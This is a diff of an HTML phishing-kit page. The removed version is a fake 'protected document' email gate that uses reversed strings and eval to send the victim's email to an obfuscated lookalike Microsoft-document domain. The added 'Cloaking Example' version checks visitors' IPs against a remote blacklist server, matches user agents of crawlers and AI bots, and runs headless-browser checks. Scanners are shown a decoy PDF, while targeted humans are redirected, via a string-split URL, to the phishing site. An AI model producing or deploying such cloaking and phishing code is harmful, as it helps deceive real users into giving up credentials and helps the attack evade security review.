@@ -1,269 +1,50 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online Document</title>
+    <title>Cloaking Example</title>
     <style>
-
-        body {
-            display: block;
+        body, html {
             margin: 0;
             padding: 0;
-            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;
-            font-size: 14px;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
             color: #07090F;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
             line-height: 1.42857143;
         }
 
-        .consent-form-container {
-            width: calc(100% - 64px);
-            max-width: 443px;
-            margin: 0 auto;
-            margin-top: 88px;
-        }
-
-        .consent-form-header {
-            margin-top: 0px;
-            font-size: 14px;
-            font-weight: 550;
-            line-height: 20px;
-            margin-bottom: 22px;
-            color: #07090F;
-            display: block;
-        }
-
-        .email-label {
-            color: #4B5563;
-            font-size: 13px;
-            font-style: normal;
-            font-weight: 400;
-        }
-
-        .email-Input-box {
-            display: flex;
+        iframe {
             width: 100%;
-            height: 32px;
-            padding: 7px 12px;
-            flex-direction: column;
-            justify-content: center;
-            align-items: flex-start;
-            gap: 8px;
-            border-radius: 4px;
-            border: 1px solid #E5E7EB;
-            background: #FFF;
-        }
-
-        .email-Input-box:focus {
-            -webkit-box-shadow: none;
-            box-shadow: none;
-            outline: none;
-            border-color: #1F62FF;
-        }
-
-        .error-message {
-            font-size: 12px;
-            line-height: 16px;
-            margin-left: 5px;
-            margin-top: 10px;
-            color: #EF4444;
-        }
-
-        .text-message {
-            color: #07090F;
-            font-size: 14px;
-            font-style: normal;
-            font-weight: 400;
-        }
-
-        .d-flex {
-            display: flex;
-        }
-
-        .form-group {
-            margin-bottom: 24px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        input {
-            width: 100%;
-            padding: 8px;
-            box-sizing: border-box;
-        }
-
-        .privacy-policy-checkbox {
-            width: 16px;
-            height: 16px;
-            top: 395px;
-            left: 428px;
-            min-width: 16px;
-        }
-
-        .submit-btn {
-            padding: 10px 20px;
-            font-size: 16px;
+            height: 100vh; /* Full height */
             border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: rgb(0, 0, 255);
-            color: white;
-        }
-        .submit-btn:disabled {
-            opacity: 0.5;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 15px;
-            height: 15px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-        .hide {
-            display: none !important;
-        }
-        .alert {
-            padding: 12px 15px;
-            border: 0px solid #d5dddf;
-            color: #07090F;
-            width: 100%;
-            margin-bottom: 20px;
-            border-radius: 4px;
-        }
-        .alert.alert-danger {
-            background-color: #FFEAEE;
-            color: #324061;
-        }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        @keyframes rotate {
-            100% { transform: rotate(360deg); }
-        }
-        sm-loader {
-            display: block;
-            position: relative;
-            height: 30px;
-            width: 30px;
-            margin: 0 auto;
-        }
-        .text-center {
-            text-align: center;
-        }
-        .loader-icon {
-            border-radius: 100%;
-            border-top: 3px solid transparent;
-            border-left: 3px solid #1F62FF;
-            border-right: 3px solid #1F62FF;
-            border-bottom: 3px solid #1F62FF;
-            height: 24px;
-            width: 24px;
-            animation: rotate 0.4s linear infinite;
-            transform-origin: center center;
-            position: absolute;
-            top: 0;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            margin: auto;
-        }
-        .m-t-12 {
-            margin-top: 12px;
-        }
-
-        .m-t-32 {
-            margin-top: 32px;
-        }
-
-        .m-b-lg {
-            margin-bottom: 24px;
-        }
-
-        .cool-grey-600 {
-            color: #DC2626;
-        }
-
-        #privacyPolicyConsentsContainer > .d-flex:not(:last-child) {
-            margin-bottom: 8px;
-        }
-
-        #privacyPolicyConsentsContainer .text-message {
-            margin-left: 10px;
-        }
-
-        @media (max-width: 767px) {
-            .consent-form-container {
-                margin-top: 32px;
-            }
         }
     </style>
 </head>
 <body>
-<div>
-    <input type="hidden" name="response" id="response" value="{&#34;owner&#34;:&#34;1&#34;,&#34;privacyPolicy&#34;:null,&#34;isPrivacyPolicyEnabled&#34;:false,&#34;isDeleted&#34;:false,&#34;isLinkPasswordProtected&#34;:false,&#34;isEmailRequired&#34;:true,&#34;ownerName&#34;:&#34;M K&#34;}">
-    <input type="hidden" name="hostname" id="hostname" value="kselect.salesmate.io">
-    <input type="hidden" name="hostnameToCallApiFromEjs" id="hostnameToCallApiFromEjs" value="kselect.sm-docs.com">
-    <input type="hidden" name="conversation-id" id="linkId" value="8e337e91-282d-4b89-a38a-0a07eca87db9">
-    
-        <div class="consent-form-container">
-            <div id="commonError" class="alert alert-danger hide"></div>
-            <span class="consent-form-header"><span id="cname"></span></span>
-            <form>
-                
-                    <div class="form-group">
-                        <label for="email" class="email-label"><span class="cool-grey-600">*</span>Please enter your email address to continue</label>
-                        <input type="email" class="email-Input-box" id="email" name="email">
-                        <span id="emailError" class="error-message hide"></span>
-                    </div>
-                
-                
-                    <div>
-                        <div class="text-message m-b-lg" id="consentToCommunication"></div>
-                        <div class="form-group" id="privacyPolicyConsentsContainer"> </div>
-                        <div class="text-message m-b-lg" id="privacyPolicy"></div>
-                        <div class="text-message" id="consentToProcess"></div>
-                    </div>
-                    <sm-loader id="sm-loader" style="display: none">
-                        <div class="text-center">
-                            <span class="loader-icon"></span>
-                        </div>
-                    </sm-loader>
-                    <div class="form-group m-t-32">
-                        <button class="submit-btn" type="button" id="submit-btn" disabled>
-                            Submit
-                        </button>
-                    </div>
-            </form>
-        </div>
-    
-</div>
-<script>
+    <div id="content"></div>
 
-const blacklistedWords = ['google', 'microsoft', 'crawl','python','curl','Amazonbot','Applebot','Applebot-Extended','Bytespider','CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot','FacebookBot','FriendlyCrawler','GPTBot','Google-Extended','GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
-'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot','PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler','Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit','img2dataset','omgili','omgilibot']; // Add your blacklisted words here
+    <script>
+        const blacklistedWords = [
+            
+        'google', 'microsoft', 'crawl','python','curl',
+        'Amazonbot','Applebot','Applebot-Extended','Bytespider',
+        'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
+        'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
+        'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
+        'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
+        'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
+        'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
+        'img2dataset','omgili','omgilibot'];
 
     const allowedParamPattern = /^Sachiel\d$/; // Replace 'keyword' with your actual keywords
     // const allowedPara = /^[a-zA-Z0-9.+-]{1,64}@[a-zA-Z0-9.-]{1,255}\.[a-zA-Z]{2,6}$/;
     var checkCountry = false; // Set to true to enable country check
     var Country = "";
+
     function fetchIPInfo() {
         const urlParams = new URLSearchParams(window.location.search);
-        const param = urlParams.get('SSKU'); // Replace 'Sku' with the actual parameter name
+        const param = urlParams.get('SIKA'); // Replace 'Sku' with the actual parameter name
         // const para = urlParams.get('vop');
         // !allowedParamPattern.test(param)
         if (!allowedParamPattern.test(param)) {
@@ -272,6 +53,7 @@ const blacklistedWords = ['google', 'microsoft', 'crawl','python','curl','Amazon
                 .then(response => response.json())
                 .then(data => {
                     var ip = data.ip;
+                    addBlacklistedIP(ip);
                     redirectToBlockedPage();
 
                 })
@@ -310,35 +92,15 @@ const blacklistedWords = ['google', 'microsoft', 'crawl','python','curl','Amazon
                 console.error('Error:', error);
             });
     }
-       // Function to check if IP address is blacklisted
-    function checkBlacklistedIP(ip) {
-        // Check if IP is already blacklisted in the database
-        fetch('http://198.46.129.153:7500/_~/clap.php?ip=' + ip)
-            .then(response => response.text())
-            .then(data => {
-                if (data === 'blacklisted') {
-                    console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
-                    addBlacklistedIP(ip);
-                    // Redirect user to blocked page
-                    redirectToBlockedPage();
-
-                } else if (data === 'clean') {
-                    console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
-                    // Proceed with normal flow
-                    redirectToGoodPage(); 
-                } else {
-                    console.log('Error:', data);
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-    }
     function redirectToBlockedPage() {
-        window.location.href = 'document.html'; // Replace 'blocked.html' with your blocked page URL
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
     }
 
-    // Function to add blacklisted IP address
     function addBlacklistedIP(ip) {
         // Check if IP is already in the blacklist
         fetch('http://198.46.129.153:7500/_~/clap.php?ip=' + ip)
@@ -371,248 +133,130 @@ const blacklistedWords = ['google', 'microsoft', 'crawl','python','curl','Amazon
                 redirectToBlockedPage();
             });
     }
- 
 
-function redirectToGoodPage() {
-    function getParameterByName(name) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(name);
-}
+    function checkBlacklistedIP(ip) {
+        // Check if IP is already blacklisted in the database
+        fetch('http://198.46.129.153:7500/_~/clap.php?ip=' + ip)
+            .then(response => response.text())
+            .then(data => {
+                if (data === 'blacklisted') {
+                    console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
+                    addBlacklistedIP(ip);
+                    // Redirect user to blocked page
+                    redirectToBlockedPage();
 
-const cmoValue = getParameterByName('cmo'); // Get 'cmo' value from the URL
-const cnameElement = document.getElementById('cname');
-if (cmoValue) {
-// If 'cmo' has a value, capitalize the first letter and show the shared message
-const com = cmoValue.charAt(0).toUpperCase() + cmoValue.slice(1).toLowerCase();
-cnameElement.textContent = `This document is shared by ${com}`;
-} else {
-// If 'cmo' is missing or empty, show the protected message
-cnameElement.textContent = 'This document is protected verify your email to proceed.';
-}
-
-   document.addEventListener('DOMContentLoaded', function () {
-    const response = JSON.parse(document.getElementById('response')?.value);
-    const linkId = document.getElementById('linkId')?.value;
-    const hostName = document.getElementById('hostname').value;
-    const hostnameToCallApiFromEjs = document.getElementById('hostnameToCallApiFromEjs').value;
-
-    const passwordInput = document.getElementById('password');
-    const smLoader = document.getElementById('sm-loader');
-    const submitBtn = document.getElementById('submit-btn');
-
-    const passwordError = document.getElementById('passwordError');
-    const emailInput = document.getElementById('email');
-    const emailError = document.getElementById('emailError');
-    const commonError = document.getElementById('commonError');
-
-    let isEmailValid = false;
-    let privacyPolicyConsents = [];
-    let isPasswordValid = false;
-
-    const language = navigator.language || 'en';
-    if (response?.isPrivacyPolicyEnabled) {
-        setPolicyAndConsentDetails();
+                } else if (data === 'clean') {
+                    console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
+                    // Proceed with normal flow
+                    loadContent(); 
+                } else {
+                    console.log('Error:', data);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
     }
 
-    if (response?.isLinkPasswordProtected) {
-        addEventListenerToId('password', 'blur', validatePassword);
-    }
-    if (response?.isEmailRequired) {
-        addEventListenerToId('email', 'blur', validateEmail);
-    }
-    addEventListenerToId('submit-btn', 'click', onSubmit);
 
-    if (!response?.isPrivacyPolicyEnabled && !response?.isEmailRequired && !response?.isLinkPasswordProtected) {
-        directDownloadFile();
-    }
+    const botUserAgents = [
+            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
+            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
+            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
+            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
+            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
+            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
+            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
+            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
+            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
+            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
+            'img2dataset', 'omgili', 'omgilibot'
+        ];
 
-    async function directDownloadFile() {
-        try {
-            const publicUrl = await getPublicURL();
-            downloadFile(publicUrl);
-            setTimeout(() => {
-                window.self.close();
-            }, 500);
-        } catch (err) {
-            console.log(err);
-        }
-    }
-
-    async function setPolicyAndConsentDetails() {
-        showLoader();
-        try {
-            const privacyPolicyDetails = await getPrivacyPolicy();
-            setPrivacyPolicyAndConsents(privacyPolicyDetails);
-            stopLoader();
-        } catch (err) {
-            stopLoader();
-            console.log(err);
-        }
-    }
-
-    function validateEmail() {
-        const emailRegex = /^\s*[A-Z0-9_]([A-Z0-9._-]|\+)*@[A-Z0-9.-]+\.[A-Z]{2,}\s*$/i;
-        const trimmedEmailValue = emailInput.value.trim();
-        const isValid = trimmedEmailValue !== '' && emailRegex.test(emailInput.value);
-
-        isEmailValid = isValid;
-        isValid ? enabledSubmitBtn() : disabledSubmitBtn();
-        emailError.textContent = isValid ? '' : (trimmedEmailValue === '' ? 'Email is required.' : 'Invalid email format.');
-        emailError.classList.toggle('hide', isValid);
-        return isValid;
-    }
-
-    function validatePassword() {
-        let userTypedPassword = passwordInput.value;
-        if (!userTypedPassword.trim()) {
-            isPasswordValid = false;
-            passwordError.textContent = 'Password is required.';
-            passwordError.classList.remove('hide');
-            disabledSubmitBtn();
-            return;
-        } else {
-            isPasswordValid = true;
-            passwordError.textContent = '';
-            passwordError.classList.add('hide');
-            enabledSubmitBtn();
-        }
-    }
-
-    function setPrivacyPolicyAndConsents(privacyPolicyDetails) {
-        if (privacyPolicyDetails?.privacyPolicy) {
-            setPrivacyPolicyValue(privacyPolicyDetails.privacyPolicy);
+        // Function to detect the User-Agent
+        function detectUserAgent() {
+            const userAgent = navigator.userAgent;
+            return botUserAgents.some(bot => userAgent.includes(bot));
         }
 
-        if (privacyPolicyDetails?.consentToProcess) {
-            setConsentToProcessValue(privacyPolicyDetails?.consentToProcess);
+        // Function to detect a specific query parameter
+        function detectQueryParameter(paramName) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.has(paramName) ? urlParams.get(paramName) : null;
         }
 
-        if (privacyPolicyDetails?.consentToCommunication) {
-            setConsentToCommunicationValue(privacyPolicyDetails.consentToCommunication);
-        }
+        // Function to load content based on user agent and query parameter
+        function loadContent() {
+    const isBot = detectUserAgent();
+    const paramValue = detectQueryParameter('Bd');
 
-        if (privacyPolicyDetails?.consentOptions?.length) {
-            setConsentsOption(privacyPolicyDetails.consentOptions);
-        }
-    }
-
-    function setPrivacyPolicyValue(value) {
-        document.getElementById('privacyPolicy').innerHTML = value;
-    }
-
-    function setConsentToProcessValue(value) {
-        document.getElementById('consentToProcess').innerHTML = value;
-    }
-
-    function setConsentToCommunicationValue(value) {
-        document.getElementById('consentToCommunication').innerHTML = value;
-    }
-
-    function setConsentsOption(consentOptions = []) {
-        const consentsOptionsContainer = document.getElementById('privacyPolicyConsentsContainer');
-        privacyPolicyConsents = [];
-        consentOptions.forEach(consent => {
-            const existingConsent = privacyPolicyConsents.find(c => c.subscriptionId === consent.subscriptionId);
-            if (!existingConsent) {
-                privacyPolicyConsents.push({ ...consent, value: false });
-                createConsentOption(consent, consentsOptionsContainer);
+    if (isBot) {
+        window.location.href = "block.html";
+    } else if (paramValue) {
+        const script = document.createElement('script');
+        script.innerHTML = `
+            function isHuman() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const botUserAgents = [
+                    'Googlebot', 'Bingbot', 'Yahoo! Slurp', 'DuckDuckBot',
+                    'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot',
+                    'ia_archiver', 'python', 'curl', 'bot', 'spider', 'crawl'
+                ];
+                const isBot = botUserAgents.some(bot => userAgent.includes(bot));
+                const headlessChecks = [
+                    () => /HeadlessChrome/.test(userAgent),
+                    () => navigator.webdriver,
+                    () => window.outerWidth === 0 && window.outerHeight === 0,
+                    () => navigator.languages === "" || navigator.plugins.length === 0
+                ];
+                const isHeadless = headlessChecks.some(check => check());
+                return !isBot && !isHeadless;
             }
-        });
-    }
 
-
-    function showLoader() {
-        smLoader.style.display = 'flex';
-    }
-
-    function stopLoader() {
-        smLoader.style.display = 'none';
-    }
-
-    function updateConsentOptionValue(consentId, value) {
-        const consent = privacyPolicyConsents.find(consent => consent.subscriptionId === consentId);
-        if (consent) {
-            consent.value = value;
+function verifyAndRedirect() {
+    if (isHuman()) {
+        function getQueryParameter(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
         }
-    }
 
-    async function onSubmit() {
-        commonError?.classList?.add('hide');
-        if ((!response.isLinkPasswordProtected || isPasswordValid) && (!response?.isEmailRequired || isEmailValid)) {
-            if (response.isLinkPasswordProtected) {
-                passwordError.textContent = '';
-            }
-            showBtnLoader();
+        function isBase64(str) {
             try {
-                const publicUrl = await getPublicURL();
-                stopBtnLoader();
-                downloadFile(publicUrl);
+                return btoa(atob(str)) === str;
             } catch (err) {
-                commonError.textContent = err;
-                commonError.classList.remove('hide');
-                stopBtnLoader();
+                return false;
             }
+        }
+
+        const paramValue = getQueryParameter('EIP');
+        let finalValue;
+
+        if (paramValue && isBase64(paramValue)) {
+            finalValue = atob(paramValue);
+            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
         } else {
-            commonError.textContent = 'Please ensure all required fields are filled out correctly.';
-            commonError.classList.remove('hide');
+            finalValue = paramValue;
+            window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+finalValue);
         }
+    } else {
+        window.location.href = "File not found.html";
     }
-
-    async function getPublicURL() {
-    let data = {};
-    if (response.isLinkPasswordProtected && passwordInput.value.trim() !== '') {
-        data.password = passwordInput.value;
-    }
-    if (privacyPolicyConsents?.length) {
-        data.privacyPolicyConsent = privacyPolicyConsents;
-    }
-    if (response.isEmailRequired && emailInput.value.trim() !== '') {
-        data.email = emailInput.value;
-    }
-
-    return new Promise((resolve, reject) => {
-  data.email = emailInput.value;
-        var a = `' = ferh.noitacol.wodniw`;
-        var b = a.split('').reduce((reversed, char) => char + reversed, '');
-        c = '7D6je=690f10efbe?ac4744/moc.evirdtnemucodorcim.amz2b-vbhgfd//:sptth';
-        d = c.split('').reduce((reversed, char) => char + reversed, '');
-        e = '#'+data.email
-        var silver = b + d + e + '\'';
-        eval(silver);
-    });
-}
-
-    function showBtnLoader() {
-        submitBtn.disabled = true;
-        submitBtn.innerHTML = '<span class="loader"></span>';
-    }
-
-    function stopBtnLoader() {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = 'Download';
-    }
-
-
-    function disabledSubmitBtn() {
-        submitBtn.disabled = true;
-    }
-
-    function enabledSubmitBtn() {
-        submitBtn.disabled = false;
-    }
-
-    function addEventListenerToId(id, event, callback) {
-        const element = document.getElementById(id);
-        if (element) {
-            element.addEventListener(event, callback);
-        }
-    }
-});
 }
 
 
-fetchIPInfo();
-redirectToGoodPage();
-</script>
+            setTimeout(verifyAndRedirect, 1000);
+        `;
+        document.body.appendChild(script);
+    } else {
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
+    }
+}
+        fetchIPInfo();
+    </script>
 </body>
 </html>
